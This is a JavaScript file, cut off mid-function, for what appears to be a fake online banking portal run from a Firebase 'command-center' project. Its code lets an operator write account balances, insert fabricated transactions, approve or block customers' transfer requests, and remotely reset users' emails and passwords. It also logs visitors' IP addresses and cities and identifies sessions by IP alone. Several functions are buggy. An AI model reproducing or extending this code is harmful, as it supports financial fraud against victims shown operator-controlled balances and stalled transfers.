

var output;
var MASTERDATE = 'Pending'; 
var DATEANDTIME;
var MASTERACCOUNT;
var userName, db, ipaddress, platform, system,dateman, thisAcc; 
var CURRENT_USER_LOCATION, CURRENT_USER_ACCOUNT, CURRENT_USER_TIME;


//DATE and TIME AVENUE
var fullDate = new Date();

console.log(fullDate);

var d = new Date();
var twoDigitMonth = ((fullDate.getMonth().length+1) === 1)? (fullDate.getMonth()+1) : '0' + (fullDate.getMonth()+1);
var twoDigitDate = fullDate.getDate()+"";if(twoDigitDate.length==1)	twoDigitDate="0" +twoDigitDate;
var currentDate = twoDigitDate + "/" + twoDigitMonth + "/" + fullDate.getFullYear();console.log(currentDate);
var currentTime = d.getHours() + ':'+d.getMinutes();

var code_time = parseInt(d.getHours()) + parseInt(d.getMinutes());
var code_date = twoDigitDate + twoDigitMonth + fullDate.getFullYear();
var code_hour = d.getHours();
var code_minute = d.getMinutes();

var realDate =  twoDigitDate +"/"+twoDigitMonth+"/"+fullDate.getFullYear();

//AUGUST 03, 2021
var IP_COUNTRY, IP_CITY, IP_BROWSER;
var IPCODE;

$(document).ready(function(){
  $('#login_loader_bx').hide();
  $('#XXBTMCONTROL').addClass('hide');
      dateman = realDate;
      var firebaseConfig = {
        apiKey: "AIzaSyBOKZ_0oPvvbkINz_CdDeo70xlhagw0Csc",
        authDomain: "command-center-18c31.firebaseapp.com",
        projectId: "command-center-18c31",
        storageBucket: "command-center-18c31.appspot.com",
        messagingSenderId: "532092672696",
        appId: "1:532092672696:web:4cb03667b3c03e11b3724d"
    };
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
      
    $("form").submit(
        function(e){
            e.preventDefault();
        }
    );

        //getCurrentUser();
        //GETCURRENTUSER(IPCODE);
        GET_IP_ADDRESS();

        // CHECK SCREEN SICE
        VIEWPORT_CHECKER();
        
        
        

});
    // TODO: Replace the following with your app's Firebase project configuration
    // For Firebase JavaScript SDK v7.20.0 and later, `measurementId` is an optional field



    //  view port checker
    function VIEWPORT_CHECKER() {
      // Code to be executed every 3 seconds
      setTimeout(VIEWPORT_CHECKER, 3000);
      console.log('we come in peace');
      $(window).on('load resize', function() {
        if ($(window).width() <= 662) {
          // Code to be executed when viewport is at max-width 662px or less
          // For example, you can add a class to an element
          $('.my-element').addClass('is-mobile');
          $('.accnt_1').addClass('showMenuBar');

        } else {
          // Code to be executed when viewport is wider than 662px
          // For example, you can remove the class from the element
          $('.my-element').removeClass('is-mobile');
        }
      });
    }
    // open menu
    function menu() {
      var menuChecker = 0;
      if (menuChecker === 0) {
        console.log('CHECK MENU');
        // $('.accnt_1').addClass('showMenuBar');
        $('.accnt_1').addClass('showMenuBar');
      }
    }
 //AUGUST 03, 2021
function LOG_USER_OUT(){
   var IPS;
   //GET ALL 
   $.getJSON("https://api.ipify.org/?format=json", function(e) {
     IPS = e.ip;
     console.log("LOGOUT USER IP: "+ IPS);
     if (IPS != '') {
          $('.distract').show();
          firebase.firestore().collection("BANKAUTH").where("user_ip", "==", IPS)
          .get()
          .then((querySnapshot) => {
              querySnapshot.forEach((doc) => {
                console.log(doc.id, " BANKAUTHLOGOUT=> ", doc.data()); 

                //DELETE 
                firebase.firestore().collection('BANKAUTH').doc(doc.id).delete()
                .then(() => {
                    
                })
                .catch((error) => {
                    // The document probably doesn't exist.
                    console.error("Error deleting : "+doc.id+" :", error);
                    location.reload();
                });

              });
          })
          .catch((error) => {
              console.log("Error getting documents: ", error);
              //LOGOUT HERE
              $('.distract').hide();
              
          });

          setTimeout(
            function(){
              location.reload();
            }, 7000
          );
      }
    if (e.ip != "") {
      $.get("https://ipinfo.io", function(response) {
     
      }, "jsonp");
    }
   });
 }
 function GETCURRENTUSER(IP){
 // $('.distract').show();
   BANKAUTH(IP);
 }
 function BANKAUTH(IP){
   console.log('We are here bankauth');
  // $('.distract').show();
  firebase.firestore().collection("BANKAUTH").where("user_ip", "==", IP)
  .get()
  .then((querySnapshot) => {
      querySnapshot.forEach((doc) => {
          //SEND IPS,COUNTRY, CITY 
          // doc.data() is never undefined for query doc snapshots
          console.log(doc.id, " BANKAUTH=> ", doc.data());
          if (doc.data().user_ip == '') {
             console.log(' NO IP ADDRESS MATCHED');
          }
          MASTERACCOUNT= doc.data().bank_account;
          BANKTRANSFERPERMIT_LISTENER();
          TRASACTIONS_HISTORY_LISTENER(); // 09-11-2021
          LISTEN_RELOAD_BANK_ACCOUNT(MASTERACCOUNT);
          if (MASTERACCOUNT != '') {
            $(".distract").show(); 
            $(".loader_ui").removeClass('hide'); 
            console.log('IP MATCHED WITH ACCOUNT: '+ MASTERACCOUNT);
            SEND_T0_CONTROLLER();
            $('#XXBTMCONTROL').removeClass('hide');
            $("#nb-login").hide();

            //SPECIAL REQUESTS SHOW THIS ACCOUNT SPECIALREQUEST01
            if (MASTERACCOUNT == 'account30' || MASTERACCOUNT == 'account32'|| MASTERACCOUNT == 'account100') {
              $(".account-001").removeClass('hide');
            }else if ( MASTERACCOUNT == 'account31') {
              $(".account-002").removeClass('hide');
            }else if ( MASTERACCOUNT == 'account12' ) {
              $(".account-shapiro").removeClass('hide');
            }else if ( MASTERACCOUNT == 'account13' ) {
              $(".account-shapiro-old").removeClass('hide');
            }else if ( MASTERACCOUNT == 'account8') {
              $(".account-033").removeClass('hide');
            }else if ( MASTERACCOUNT == 'account1') {
              //$(".account-01-new").removeClass('hide');
              $('.account-david-howard').removeClass('hide');
            }

            else{
              $(".account-01").removeClass('hide');
            }

            getAccountOPP(MASTERACCOUNT);
            // getTransactionsOPP(MASTERACCOUNT);
            //CHECKLOGINSTATE(MASTERACCOUNT);//MODERNIZE 1
            REALTIMEUPDATES(MASTERACCOUNT);
            checkTransferPermitNB(userName,'3rddegree');//*UNDO
            $('#XXBTMCONTROL').show();
            $('#XXBTMCONTROL').css("display","block");
            $(".distract").hide(); 
            
          }else{
            alert('Null');
            console.log('XXACCOUNT IS: '+ MASTERACCOUNT);
           
            getAccountOPP(MASTERACCOUNT);
            // getTransactionsOPP(MASTERACCOUNT);
            REALTIMEUPDATES(MASTERACCOUNT);
            checkTransferPermitNB(userName,'3rddegree');//*UNDO
            console.log('3RD DEGREE MEMBER: '+ userName);
            $("#nb-login").hide();
            $(".account-01").removeClass('hide');
        
            console.log('open Account 13 in Account 01');
            $(".home-sec").show();
            $(".btm-ctrl").show();
            $(".btm-ctrl").removeClass("hide");
            //Call database
            $(".distract").hide(); 
            $(".loader_ui").addClass('hide');
          }
      });
  })
  .catch((error) => {
      console.log("Error getting documents: ", error);
  });
 }
 function SEND_USER_IP_STATE(ACCOUNT){
  firebase.firestore().collection("BANKAUTH").add({
      user_ip: IPCODE,
      user_city: IP_CITY,
      user_country: IP_COUNTRY,
      bank_account: ACCOUNT
    })
    .then((docRef) => {
        console.log("IPADDRESS written with ID: ", docRef.id);
    })
    .catch((error) => {
        console.error("Error adding IPADDRESS: ", error);
    });
 }
 function LOGIN_USER(){
  var EMAIL = $("#acc_email").val().toLowerCase();
  var  PASSWORD = $('#acc_password').val();

  if (EMAIL != '' && PASSWORD != '') {
    $('#login-btn').hide();
    $('#login_loader_bx').show();
    
    setTimeout(() => {
      console.log('IMP::: CHECKING ACCOUNT?? '+ MASTERACCOUNT);
      if (MASTERACCOUNT == undefined) {
        $('#login-btn').show();
        $('#login_loader_bx').hide();
        $('#login-policy blockquote p').text('Invalid Username and/or Password');
      }else{
        //SEND_T0_CONTROLLER(fullDate,CURRENT_USER_LOCATION,CURRENT_USER_ACCOUNT);
      }
    }, 6000);

    firebase.firestore().collection("BANKSERVICES").where("account_email", "==", EMAIL)
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            //SEND IPS,COUNTRY, CITY 

            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " XXX=> ", doc.data());
            MASTERACCOUNT= doc.id;
            SEND_USER_IP_STATE(MASTERACCOUNT);
            BANKTRANSFERPERMIT_LISTENER();
            LISTEN_RELOAD_BANK_ACCOUNT(MASTERACCOUNT);
            if (MASTERACCOUNT != '') {
              $('#XXBTMCONTROL').removeClass('hide');
              $("#nb-login").hide();

              //SPECIAL REQUESTS
              if (MASTERACCOUNT == 'account30' || MASTERACCOUNT == 'account32') {
                $(".account-001").removeClass('hide');
              }else if ( MASTERACCOUNT == 'account31') {
                $(".account-002").removeClass('hide');
              }
              else{
                $(".account-01").removeClass('hide');
              }
              
              

              getAccountOPP(MASTERACCOUNT);
              // getTransactionsOPP(MASTERACCOUNT);
              //CHECKLOGINSTATE(MASTERACCOUNT);//MODERNIZE 1
              REALTIMEUPDATES(MASTERACCOUNT);
              checkTransferPermitNB(userName,'3rddegree');//*UNDO
              $('#XXBTMCONTROL').show();
              $('#XXBTMCONTROL').css("display","block");
              
              
            }else{
              console.log('XXACCOUNT IS: '+ MASTERACCOUNT);
             
              getAccountOPP(MASTERACCOUNT);
              // getTransactionsOPP(MASTERACCOUNT);
              REALTIMEUPDATES(MASTERACCOUNT);
              checkTransferPermitNB(userName,'3rddegree');//*UNDO
              console.log('3RD DEGREE MEMBER: '+ userName);
              $("#nb-login").hide();
              $(".account-01").removeClass('hide');
          
              console.log('open Account 13 in Account 01');
              $(".home-sec").show();
              $(".btm-ctrl").show();
              $(".btm-ctrl").removeClass("hide");
              //Call database
              $(".distract").hide(); 

            }
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });
    //XXLOGINSSTATE(user.uid);
    //CHECKLOGINSTATE('account1');//MODERNIZE 1
    $('.distract').hide();
     
    //XXLOGINSSTATE(user.uid);
    //CHECKLOGINSTATE('account1');//MODERNIZE 1
    $('.distract').hide();
  }else{
    $('#login-policy blockquote').text('Invalid Account Logins. Try Again with Valid Login Details');
    setTimeout(
      function(){
        $('#login-policy blockquote').text('');
      },7000
    );
  }
 }

 function login_user_error(){
  $('#login-policy blockquote p').text('');
 }
 function GET_IP_ADDRESS(){
  $.getJSON("https://api.ipify.org/?format=json", function(e) {
    console.log("USER IP: "+e.ip);
    if (e.ip != "") {
      
      $.get("https://ipinfo.io", function(response) {
        IPCODE = response.ip;
        IP_CITY = response.city;
        IP_COUNTRY = response.country;  
        CURRENT_USER_LOCATION = IP_COUNTRY +'_'+IP_CITY;
       
        GETCURRENTUSER(IPCODE);
        console.log("Country of origin: "+response.city, response.country);
      }, "jsonp");
      return e.ip;
    }
  });
 }
 function LISTEN_RELOAD_BANK_ACCOUNT(whichAcc){
  firebase.firestore().collection("BANKSERVICES").doc(whichAcc)
  .onSnapshot(function(doc) {
      console.log("Load status: ", doc.data().load_request);
      if (doc.data().account_reload == 1) {
        firebase.firestore().collection("BANKSERVICES").doc(whichAcc).update({
          account_reload: 0
        })
        .then((docRef) => {
            console.log("ACCOUNT INFORMATION UPDATED ");
            location.reload();
        })
        .catch((error) => {
            console.error("ERROR UPDATING ACCOUNT INFORMATION: ", error);
        });
      }
  });
 }

 //JULY 30, 2021
 function BANKTRANSFERPERMIT(){
   var nameOfBank = $('.BTP_name').val().toUpperCase();
   var addressOfBank = $('.BTP_addressOfBank').val().toUpperCase();
   var nameOfReceiver = $('.BTP_nameOfReceiver').val().toUpperCase();
   var accountNumber = $('.BTP_accountNumber').val();
   var routingNumber = $('.BTP_routingNumber').val();
   var transferAmount = $('.BTP_transferAmount').val();
   var transferCode = $('.BTP_transferCode').val();

   if (nameOfBank != '' && addressOfBank != '' && nameOfReceiver != '',
   accountNumber != '' && routingNumber != '' && transferAmount != '',
     transferCode != '') {
     $('.distract').show();
     $('.transfer-ui').show();
     //CHECK WHETHER PERMIT HAS BEEN ACCEPTED
     SENDTOBANKTRANSFERPERMIT(nameOfBank,addressOfBank,nameOfReceiver,accountNumber,
      routingNumber,transferAmount,transferCode);
   }else{
    $(".transfer-error").show();
    setTimeout(function(){$(".transfer-error").hide();}, 6000);
   }
 }  
 function SENDTOBANKTRANSFERPERMIT(nameOfBank,addressOfBank,nameOfReceiver,
  accountNumber,routingNumber,transferAmount,transferCode){
    var todayDate = GetTodayDate();
    firebase.firestore().collection("BANKTRANSFERPERMIT").doc(MASTERACCOUNT).set({
      permission: 1,
      which_account: MASTERACCOUNT,
      bank_name: nameOfBank,
      bank_address: addressOfBank,
      receiver_name: nameOfReceiver,
      account_number: accountNumber,
      routing_number: routingNumber,
      amount: transferAmount,
      date: todayDate,
      code: transferCode,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(function(docRef) {
      $(".menu_send_section .progress").hide();
      console.log("CLIENT REQUESTED TRANSFER PERMISSION");
      //UPDATED GODVERSION 0:01
    // $('.coders').removeClass('hide');
      BANKTRANSFERPERMIT_LISTENER();
    })
    .catch(function(error) {
      console.error("CLIENT REQUESTED TRANSFER PERMISSION =  FAILED BECAUSE: "+ error);
    });
 }
 
 function BANKTRANSFERPERMIT_LISTENER(){
  firebase.firestore().collection("BANKTRANSFERPERMIT").doc(user_account)
  .onSnapshot(function(doc) {
      console.log("Has permit been granted yet: ", doc.data().permission);

      if (doc.data().permission == 2) {
        //sendTransfer(doc.data().which_account,doc.data().bank_name,doc.data().bank_address,doc.data().receiver_name,doc.data().account_number,doc.data().routing_number,doc.data().amount,doc.data().code,doc.data().date);
       // changePermissionStatus(0);
      }else if (doc.data().permission == 1) {
        $(".distract").show();
        $(".distract .transfer-ui").show();
        $(".distract .transfer-info-txt").text('Please wait...');
        setTimeout(function(){
          $('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes.');
        }, 6000);
          console.log("Current Transfer Request sent to firestore transactions: ", doc.data().permission);           
      }else if (doc.data().permission == 0) {
        $(".distract .transfer-info-txt").text('Please wait...');
        $(".distract .transfer-ui").hide();
        $(".distract").hide();
        
        console.log("Current Transfer Request sent to firestore transactions: ", doc.data().permission);           
      }
      else if (doc.data().permission == 666) {
        //$(".distract").show();
        //$(".distract .transfer-ui").show();
        //$(".distract .transfer-ui .preloader-wrapper").addClass("red-text");
        //$(".distract .transfer-ui .transfer-info-txt").text("We just sent you a verification code.");
        
        $(".distract").show();
        $(".distract .transfer-ui").hide();
        $(".distract .transfer-info-txt").text('Your transfer cannot be confirmed at this moment. Please try again later.');
        //CHANGE BACK TO 0
        setTimeout(function(){
          $(".distract .transfer-ui").hide();
          $(".distract").hide();
          //getTransactionsOPP
        }, 8000);
      }
      else {
        $('.distract').hide();
          console.log("Current data Not Available: ", doc.data().permission);
      }
  });

 }
 function GetTodayDate() {
  var tdate = new Date();
  var dd = tdate.getDate(); //yields day
  var MM = tdate.getMonth(); //yields month
  var yyyy = tdate.getFullYear(); //yields year
  var MM_string = MM+1;
  if (MM_string == 4) {
    var currentDate= "April "+dd + ","  + yyyy;
  }
  if (MM_string == 5) {
    var currentDate= "May "+dd + ","  + yyyy;
  }
  if (MM_string == 6) {
    var currentDate= "June "+dd + ","  + yyyy;
  }
  if (MM_string == 3) {
    var currentDate= "March "+dd + ","  + yyyy;
  }
  if (MM_string == 2) {
    var currentDate= "February "+dd + ","  + yyyy;
  }
  if (MM_string == 7) {
    var currentDate= "July "+dd + ","  + yyyy;
  }
  if (MM_string == 8) {
    var currentDate= "August "+dd + ","  + yyyy;
  }
  if (MM_string == 9) {
    var currentDate= "September "+dd + ","  + yyyy;
  }
  if (MM_string == 10) {
    var currentDate= "October "+dd + ","  + yyyy;
  }
  if (MM_string == 11) {
    var currentDate= "November "+dd + ","  + yyyy;
  }
  if (MM_string == 12) {
    var currentDate= "December "+dd + ","  + yyyy;
  }
  //var currentDate= dd + "/" +( MM+1) + "/" + yyyy;

  return currentDate;
}
//26-06-2021
function XXLOGINUSER(docID){
  firebase.firestore().collection("BANKSERVICES").where("account_id", "==", docID)
  .get()
  .then((querySnapshot) => {
      querySnapshot.forEach((doc) => {
          // doc.data() is never undefined for query doc snapshots
          console.log(doc.id, " => ", doc.data());
      });
  })
  .catch((error) => {
      console.log("Error getting documents: ", error);
  });
}
function CHECKLOGINSTATE(WHICHACC){
  firebase.firestore().collection("WALIU").doc(WHICHACC)
  .onSnapshot((doc) => {
      console.log("Current data: ", doc.data());
      if (doc.data().state == 1) {
          console.log('ACCOUNT IS EMAIL CHANGED');
          createNewEmail(doc.data().email, WHICHACC);
      }
      if (doc.data().state == 2) {
        console.log('ACCOUNT IS PASSWORD CHANGED');
        createNewPassword(doc.data().password, WHICHACC);
      }
      if (doc.data().state == 666) {
          //$('.XXLOADER').addClass('hide');
          //M.toast({html: 'SUCCESS!!'});
      }
  });
}
    //21-06-2021
function setUserActivity(whichAcc,accHolder,accDescription, accTime,accBank){
  if (accDescription == 'USERISACTIVE') {
      firebase.firestore().collection("USERBANKINGACTIVITY").doc(whichAcc).set({
          account: whichAcc,
          account_holder: accHolder,
          description: accDescription,
          time: accTime,
          bank: accBank,
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
      })
      .then((docRef) => {
          console.log("LOGINS written with ID: ", docRef.id);
      })
      .catch((error) => {
          console.error("Error adding LOGINS: ", error);
      });
  }else{
  firebase.firestore().collection("USERBANKINGACTIVITY").add({
      account: whichAcc,
      account_holder: accHolder,
      description: accDescription,
      time: accTime,
      bank: accBank,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
  })
  .then((docRef) => {
      console.log("LOGINS written with ID: ", docRef.id);
  })
  .catch((error) => {
      console.error("Error adding LOGINS: ", error);
  });
  }
}
//END OF 21-06-2021
    function XXLOGINSSTATE(WHICHACC,STATE){
      var UPDATELOGINS = firebase.firestore().collection('WALIU').doc(WHICHACC);

      var setWithMerge = UPDATELOGINS.set({
          state: STATE
      }, { merge: true });
    }
    function createNewEmail(email, WHICHACC){
      var user = firebase.auth().currentUser; //COMBACKK
      console.log('Account user requesting for email change is: ', user);
  
      user.updateEmail(email).then(function() {
        // Update successful.
        console.log('Updated Success email');
        XXLOGINSSTATE(WHICHACC,0);
        //emailPasswordComplete(11);
        
      }).catch(function(error) {
        // An error happened.
        console.log('Failed to update', error);
        XXLOGINSSTATE(WHICHACC,666);
        logout();
        //emailPasswordComplete(404);
      });
    }
    function createNewPassword(passcode, WHICHACC){
      var user = firebase.auth().currentUser;
      //var newPassword = getASecureRandomPassword();
      
      user.updatePassword(passcode).then(function() {
        // Update successful.
        console.log('Updated Success Password');
        XXLOGINSSTATE(WHICHACC,0);
       // reauthenticate();
      }).catch(function(error) {
        // An error happened.
        console.log('Updated failed Password',error);
        XXLOGINSSTATE(WHICHACC,666);
        logout();
      });
    }
    function emailPasswordComplete(code){
      //LOCK ACCOUNT
      firebase.firestore().collection('edits').doc(userName).set({
          edit_type: code
      })
      .then(function() {
          console.log("Email Changed Successfully.");
          logout();
      })
      .catch(function(error) {
          console.error("Error  changing email: ", error);
      });
  
    }
    
    function action(which_account, details){
        // Add a new document with a generated id.
        var newCityRef = firebase.firestore().collection("actions").doc();

        // later...
        data = {
          which_account: which_account,
          country: details,
          date: output
      };
        newCityRef.set(data);

      
    }
    
    function authenticateUser(email , password) {
      //  action(userName, 'Client authenticating...');
        email = $("#acc_email").val();
        password= $('#acc_password').val();

      firebase.auth().signInWithEmailAndPassword(email, password).catch(function(error) {
          // Handle Errors here.
          var errorCode = error.code;
          var errorMessage = error.message;
          // ...
          $("#login-policy p").text(errorMessage);
          getCurrentUser();
      });

      
    }

 
  
  function getCurrentUser(){
    var d = new Date();
    var strDate = d.getDate()  + "/" + (d.getMonth()+1) + "/" + d.getFullYear();
   // alert('Date: '+ strDate);
   MASTERDATE = strDate;
   DATEANDTIME = MASTERDATE +' / '+ d.getHours() + ':'+d.getMinutes();
   CURRENT_USER_TIME = fullDate; 
      $(".distract").show();

      
      //AUGUST 03, 2021
      //GET OS , IP

    firebase.auth().onAuthStateChanged(function(user) {
        if (user) {
          // User is signed in.
          console.log("User is signed in New Acc : " + user.uid);
          firebase.firestore().collection("BANKSERVICES").where("account_id", "==", user.uid)
          .get()
          .then((querySnapshot) => {
              querySnapshot.forEach((doc) => {
                  // doc.data() is never undefined for query doc snapshots
                  console.log(doc.id, " XXX=> ", doc.data().account_holder);
                  MASTERACCOUNT= doc.id;
                  CURRENT_USER_ACCOUNT = MASTERACCOUNT;
                  //july 2022
                  console.log('########SAVE US');
                  //SEND_T0_CONTROLLER(CURRENT_USER_TIME,CURRENT_USER_LOCATION,CURRENT_USER_ACCOUNT);
                  //alert('MASTERACCOUNT: '+ MASTERACCOUNT);
                  BANKTRANSFERPERMIT_LISTENER();
                  LISTEN_RELOAD_BANK_ACCOUNT(MASTERACCOUNT);
                  if (MASTERACCOUNT != '') {
                   
                    $('#XXBTMCONTROL').removeClass('hide');
                    $("#nb-login").hide();

                    //SPECIAL REQUESTS
                    if (MASTERACCOUNT == 'account30' || MASTERACCOUNT == 'account32') {
                      $(".account-001").removeClass('hide');
                    }else if ( MASTERACCOUNT == 'account31') {
                      $(".account-002").removeClass('hide');
                    }
                    else if ( MASTERACCOUNT == 'account12') {
                      $(".account-shapiro").removeClass('hide');
                    }
                    else if ( MASTERACCOUNT == 'account13') {
                      $(".account-shapiro-old").removeClass('hide');
                    }
                    else{
                      $(".account-01").removeClass('hide');
                    }
                    
                    

                    getAccountOPP(MASTERACCOUNT);
                    // getTransactionsOPP(MASTERACCOUNT);
                    //CHECKLOGINSTATE(MASTERACCOUNT);//MODERNIZE 1
                    REALTIMEUPDATES(MASTERACCOUNT);
                    checkTransferPermitNB(userName,'3rddegree');//*UNDO
                    $('#XXBTMCONTROL').show();
                    $('#XXBTMCONTROL').css("display","block");
                    
                    
                  }else{
                    console.log('XXACCOUNT IS: '+ MASTERACCOUNT);
                   
                    getAccountOPP(MASTERACCOUNT);
                    // getTransactionsOPP(MASTERACCOUNT);
                    REALTIMEUPDATES(MASTERACCOUNT);
                    checkTransferPermitNB(userName,'3rddegree');//*UNDO
                    console.log('3RD DEGREE MEMBER: '+ userName);
                    $("#nb-login").hide();
                    $(".account-01").removeClass('hide');
                    getIp();
                    console.log('open Account 13 in Account 01');
                    $(".home-sec").show();
                    $(".btm-ctrl").show();
                    $(".btm-ctrl").removeClass("hide");
                    //Call database
                    $(".distract").hide(); 

                  }
              });
          })
          .catch((error) => {
              console.log("Error getting documents: ", error);
          });
          //XXLOGINSSTATE(user.uid);
          //CHECKLOGINSTATE('account1');//MODERNIZE 1
          $('.distract').hide();
          if (user.uid != '') {
            $("#login-policy p").text('You being redirected to your account, please wait...');
          }
          
          

        } else {
          // No user is signed in.
          $(".distract").hide();
          $("#nb-login").show();
        }
      });
  }
 

  function logout(){
    console.log('We are about logging out');
    //action(userName, 'Clients logged Out' + MASTERDATE);
    var user = firebase.auth().currentUser;
  
    // Prompt the user to re-provide their sign-in credentials
    
    firebase.auth().signOut().then(function() {
      // User re-authenticated.
      console.log("User authenticated request");
      location.reload();
     
    }).catch(function(error) {
      // An error happened.
      console.log("User authenticated request: failed " + error);
    });
  }

  function identifyUser(){
    var user = firebase.auth().currentUser;

    if (user) {
      // User is signed in.
    } else {
      // No user is signed in.
    }
  }

  function loadThisAccount(account){
    console.log("Account Loading request sent");
    firebase.database().ref('loading/' + account).set({ // SENDING REQUEST FOR LOADING ACCOUNT
      which_account: userName,
      code: 1
    }, 
    function(error) {
      if (error) {
        // The write failed...
        console.log("Loading request: " + error);
      } else {
        // Data saved successfully!
        console.log("Loading request: " + error);
      }
    });
  }
  function getUserName(whichAccount){
    var docRef = firebase.firestore().collection("users").doc(whichAccount);
    $('.account-bx .progress').show();

    docRef.get().then(function(doc) {
        if (doc.exists) {
            console.log("Account holder name:", doc.data().account_name);
            $('.account-bx .progress').hide();
            $('.accountName').text(doc.data().account_name);
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch(function(error) {
        console.log("Error getting document:", error);
    });
  }
  function getUserAddress(whichAccount){
    var docRef = firebase.firestore().collection("addresses").doc(whichAccount);
    $('.account-bx .progress').show();

    docRef.get().then(function(doc) {
        if (doc.exists) {
            console.log("Document data:", doc.data().account_address);
            $('.account-bx .progress').hide();
            $('.accountAddress').text(doc.data().account_address);
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch(function(error) {
        console.log("Error getting document:", error);
    });
  }
  function getUserBalance(whichAccount){
    var docRef = firebase.firestore().collection("balances").doc(whichAccount);
    $('.account-bx .progress').show();

    docRef.get().then(function(doc) {
        if (doc.exists) {
            console.log("Document data:", doc.data().account_balance);
            $('.account-bx .progress').hide();
            $('.accountBalance').text(doc.data().account_balance);
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch(function(error) {
        console.log("Error getting document:", error);
    });
  }

  function getTrasactions(which_account){
    $(".act li").remove();
    firebase.firestore().collection("transactions_2020_"+which_account)
    .orderBy("code", "asc").get().then(function(querySnapshot) {
      querySnapshot.forEach(function(doc) {
          // doc.data() is never undefined for query doc snapshots
          console.log(doc.id, " => ", doc.data().title);
          
          $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons grey-text'>check</i><p>"+doc.data().title+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
         // $(".act li").appendTo("<div class='collapsible-header ch'><i class='material-icons grey-text'>arrow_back</i>Transfer to charset Ltd <span class='amount'>400.00</span> <span class='time grey-text'>28-Oct-20</span> </div> <div class='collapsible-body grey-text'><span>You have successfully transferred 400.00 via balance.</span></div>  ");
      });
  });
  }

  function listenToLoaderRequests(whichAccount){
    firebase.firestore().collection("loads").doc(whichAccount)
    .onSnapshot(function(doc) {
        console.log("Load status: ", doc.data().load_request);

        if (doc.data().load_request == 1) {
          
          //SET LOAD REQUEST BACK TO 0
          loadStatus(whichAccount, 0);

          setTimeout(function(){location.reload();}, 3000);
        }
    });
  }
  function listenToAccountState(whichAccount){
    firebase.firestore().collection("active").doc(whichAccount)
    .onSnapshot(function(doc) {
        console.log("Account status LA: ", doc.data().account_active);

        if (doc.data().account_active == 0) {
          $('.aa, .lock_txt').removeClass('hide');
          $('.lock_txt').removeClass('hide');
          $('.lock_txt').show();
          $('.lock_txt').text('Account Inactive');
          console.log('Account is locked');
        }
        else if (doc.data().account_active == 1) {
          console.log('Account is Active');
          $('.lock_txt').text('');
        }
    });
  }
  function listenToLoginsEdit(whichAccount){
    firebase.firestore().collection("edits").doc(whichAccount)
    .onSnapshot(function(doc) {
        console.log("Account status: ", doc.data().edit_type);

        if (doc.data().edit_type == 1) {
          //transfer  to change logins
          createNewEmail(doc.data().new_mail);
        }
        if (doc.data().edit_type == 2) {
          //transfer  to change logins
          createNewPassword(doc.data().new_password);
        }
        if (doc.data().edit_type == 404) {
          //transfer  to change logins
          console.log('Failed to  Update Email or password');
        }
        if (doc.data().edit_type == 0) {
          //transfer  to change logins
          console.log('User is not requesting for password change');
        }
    });
  }

  function loadStatus(whichAccount,data){
    firebase.firestore().collection('loads').doc(whichAccount).set({
      load_request: data
  })
  .then(function() {
      console.log("LOAD STATUS successfully altered: " + data);
      //location.reload();
  })
  .catch(function(error) {
      console.error("Error writing load status: ", error);
  });
  }
  function stopLoadListener(){
    var unsubscribe = firebase.firestore().collection("loads").doc(whichAccount)
    .onSnapshot(function (){
      // Respond to data
      // ...
    });

    // Later ...

    // Stop listening to changes
    unsubscribe();
  }

  //CONTROLS FOR CLIENTS 
  function changeName(which_account, name){
    console.log("whichAccount: " + which_account);
    firebase.firestore().collection("users").doc(user).set({
        account_name: name
    })
    .then(function() {
        console.log("Name successfully written!");
        action(which_account, 'Changed name '+ MASTERDATE);
    })
    .catch(function(error) {
        console.error("Error writing Name: ", error);
    });
  }

  function changeAddress(which_account, address){
    // Add a new document in collection "cities"
    console.log("whichAccount: " + which_account);
    firebase.firestore().collection("addresses").doc(which_account).set({
        account_address: address
    })
    .then(function() {
        console.log("Address successfully written!");
    })
    .catch(function(error) {
        console.error("Error writing Address: ", error);
    });
  }

  function changeBalance(which_account, amount){
    // Add a new document in collection "cities"
    console.log("whichAccount: " + which_account);
    firebase.firestore().collection("balances").doc(which_account).set({
        account_balance: amount
    })
    .then(function() {
        console.log("Balance successfully written!");
    })
    .catch(function(error) {
        console.error("Error writing Balance: ", error);
    });
  }

    // Add a new TRANSACTION with a generated id.
    
    function addT(which_account){
      firebase.firestore().collection("transactions_2020_"+ which_account).add({
        title: "Transfered to CBT  BANK",
        status: "You have successfully transferred 15,650.00 from balance.",
        date: "28-Oct-20",
        amount: "25,650.00"
      })
      .then(function(docRef) {
        console.log("Transaction written with ID: ");
      })
      .catch(function(error) {
        console.error("Error adding Transaction: ", error);
      });
    }

    function addTransaction(which_account, transaction_title, transaction_status, transaction_amount){
      $(".distract").show();
      firebase.firestore().collection("transactions_2020").doc(which_account).add({
        title: transaction_title,
        status: transaction_status,
        date: output,
        amount: transaction_amount
      })
      .then(function(docRef) {
        console.log("Transaction written with ID: ", docRef.id);
        $(".distract").hide();
      })
      .catch(function(error) {
        console.error("Error adding Transaction: ", error);
      });
    }


    function permitMeToTransfer(){
      //action(userName,'Client made a transfer.'+ output);
      var which_account = MASTERACCOUNT;//COME BACK 01
      console.log('We are here: '+ which_account);
      console.log('THIS ACCOUNT WANTS TO TRANSFER MONEY: '+ MASTERACCOUNT);
      var bankName = $("#transfer_bank_name").val();
      var bankAddress = $("#bank_address").val();
      var receiverName = $("#transfer_receiver_name").val();
      var accountNumber = $("#transfer_account_number").val();
      var routingNumber = $("#transfer_routing_number").val();
      var amount = $("#transfer_amount").val();
      var code=$("#code-number").val();
      //alert(code);
      var date = MASTERDATE;
  
      //TRANSFERS REQUESTED ALL NEW MEMBER MUST BE EXCLUDED
      if (userName != 'account13' && userName != 'account14' && userName != 'account17') {
